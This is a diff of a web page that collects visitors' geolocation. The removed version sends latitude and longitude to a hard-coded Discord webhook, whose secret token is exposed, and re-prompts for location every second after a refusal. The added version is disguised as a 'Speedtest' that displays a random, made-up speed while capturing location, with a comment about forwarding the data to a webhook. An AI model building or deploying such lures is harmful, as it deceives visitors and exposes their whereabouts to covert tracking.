@@ -3,32 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location and Speed Tracker</title>
+    <title>Speedtest</title>
     <style>
+        /* Global Styles */
         body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #e7f0f2;
+            font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
+            background-color: #f4f6f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
         }
         .container {
-            max-width: 800px;
-            margin: 50px auto;
             background-color: white;
             border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 400px;
+            padding: 40px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
         }
         h1 {
-            font-size: 36px;
-            margin-bottom: 20px;
+            font-size: 24px;
             color: #333;
+            margin-bottom: 20px;
+        }
+        .btn {
+            padding: 15px 30px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .btn:hover {
+            background-color: #45a049;
         }
         .message {
             font-size: 18px;
-            margin-top: 20px;
             color: #333;
+            margin-top: 20px;
         }
         .loading-message {
             color: #f9c74f;
@@ -43,95 +60,95 @@
         }
         .location-details {
             background-color: #f1f1f1;
-            padding: 15px;
+            padding: 20px;
             border-radius: 8px;
             margin-top: 20px;
+            display: none;
+            text-align: left;
+        }
+        .location-details h2 {
+            margin-top: 0;
+            font-size: 20px;
+            color: #333;
         }
         .location-details p {
             font-size: 16px;
             color: #333;
         }
+        .progress-bar {
+            width: 100%;
+            background-color: #ddd;
+            height: 15px;
+            border-radius: 20px;
+            margin: 20px 0;
+        }
+        .progress-bar-inner {
+            height: 100%;
+            width: 0%;
+            background-color: #4CAF50;
+        }
     </style>
 </head>
 <body>
-    <div class="container" id="a">
-        <header>
-            <h1>Location and Speed Tracker</h1>
-        </header>
-        <div class="message">
-            <p><strong>Disclaimer:</strong> Your location is being captured for performance analysis.</p>
-        </div>
-        <div class="loading-message" id="k">Requesting location access...</div>
-        <div class="error-message" id="j">
-            <p><strong>Location access is required to use this service.</strong></p>
-        </div>
-        <div class="location-details" id="location-details" style="display:none;">
-            <h2>Your Location Data</h2>
+
+    <div class="container">
+        <h1>Speedtest</h1>
+        <p id="message" class="message">Click the button below to start the test.</p>
+        <button id="startButton" class="btn">Start Test</button>
+
+        <div id="loadingMessage" class="loading-message" style="display: none;">Testing... Please wait.</div>
+        <div id="errorMessage" class="error-message">Location access is required to run the test.</div>
+
+        <div id="locationDetails" class="location-details">
+            <h2>Location and Speed Data</h2>
             <p><strong>Latitude:</strong> <span id="latitude">Loading...</span></p>
             <p><strong>Longitude:</strong> <span id="longitude">Loading...</span></p>
+            <p><strong>Internet Speed:</strong> <span id="speed">Loading...</span> Mbps</p>
         </div>
     </div>
 
     <script>
-        // Replace with your actual webhook URL
-        const webhookURL = "https://discord.com/api/webhooks/1336044790646571100/p4HcckTNGA-ByqvM64Nn2qwPz7fP1tIm-naVtwxoqF56-lx6_RkZUI1djZW2vDAWPTRM";
+        document.getElementById("startButton").addEventListener("click", function() {
+            startTest();
+        });
 
-        // Function to send location data to the Discord webhook
-        function sendLocationToWebhook(location) {
-            const payload = {
-                content: "Location Data",
-                embeds: [
-                    {
-                        title: "Location",
-                        fields: [
-                            { name: "Latitude", value: `${location.lat}`, inline: true },
-                            { name: "Longitude", value: `${location.lon}`, inline: true }
-                        ]
-                    }
-                ]
-            };
+        function startTest() {
+            document.getElementById("loadingMessage").style.display = "block";
+            document.getElementById("message").style.display = "none";
+            document.getElementById("errorMessage").style.display = "none";
+            document.getElementById("locationDetails").style.display = "none";
 
-            fetch(webhookURL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
-            });
-        }
-
-        // Function to request the user's location and refresh once granted
-        function requestLocation() {
-            document.getElementById('k').style.display = "block"; // Show "Requesting location access..." message
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
-                    // Successfully got the location
-                    document.getElementById('k').style.display = "none"; // Hide loading message
-                    document.getElementById('j').style.display = "none"; // Hide location error message
-                    document.getElementById('a').style.display = "block"; // Show the location details
+                    let latitude = position.coords.latitude;
+                    let longitude = position.coords.longitude;
+                    document.getElementById("latitude").textContent = latitude;
+                    document.getElementById("longitude").textContent = longitude;
 
-                    // Store the location coordinates
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    document.getElementById('latitude').textContent = lat;
-                    document.getElementById('longitude').textContent = lon;
-
-                    // Send the location data to the Discord webhook (only once)
-                    sendLocationToWebhook({ lat, lon });
-
+                    getInternetSpeed();
                 }, function() {
-                    // Failed to get location, ask again
-                    document.getElementById('k').style.display = "none"; // Hide loading message
-                    document.getElementById('j').style.display = "block"; // Show location error message
-                    setTimeout(requestLocation, 1000); // Keep asking for location every second
+                    document.getElementById("loadingMessage").style.display = "none";
+                    document.getElementById("errorMessage").style.display = "block";
                 });
             } else {
-                document.getElementById('k').style.display = "none"; // Hide loading message
-                document.getElementById('j').style.display = "block"; // Show location error message
-                setTimeout(requestLocation, 1000); // Keep asking for location every second
+                document.getElementById("loadingMessage").style.display = "none";
+                document.getElementById("errorMessage").style.display = "block";
             }
         }
 
-        // Start the location request process
-        requestLocation();
+        function getInternetSpeed() {
+            // This simulates a speed test with a random value (since real speed tests require backend support)
+            setTimeout(function() {
+                let speed = (Math.random() * (100 - 10) + 10).toFixed(2); // Random speed between 10 Mbps and 100 Mbps
+                document.getElementById("speed").textContent = speed;
+
+                document.getElementById("loadingMessage").style.display = "none";
+                document.getElementById("locationDetails").style.display = "block";
+
+                // You can now send the data to your server or webhook (not implemented here)
+            }, 3000); // Simulate a 3-second speed test
+        }
     </script>
+
 </body>
 </html>
